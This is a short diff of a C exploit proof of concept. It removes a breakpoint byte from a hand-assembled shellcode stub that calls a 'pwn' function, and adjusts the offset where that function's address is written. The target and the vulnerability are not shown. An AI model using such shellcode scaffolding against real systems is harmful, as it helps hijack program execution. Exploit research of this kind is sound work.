@@ -51,7 +51,7 @@ int main()
 
 		unsigned char exploit[] = {
 			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// pointer to shellcode start
-			0xCC,														// breakpoint
+			//0xCC,														// breakpoint
 			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// movabs rax, pwn
 			0xFF, 0xD0,													// call rax
 			0xC3,														// ret
@@ -65,7 +65,7 @@ int main()
 			memcpy(buffer, exploit, sizeof(exploit));
 
 			*(uint64_t*)buffer = (uint64_t)(buffer + 8);
-			*(uint64_t*)(buffer + 11) = (uint64_t)pwn;
+			*(uint64_t*)(buffer + 10) = (uint64_t)pwn; // 11 if breakpoint active
 
 			uint64_t target = (uint64_t)(buffer + 8);
 
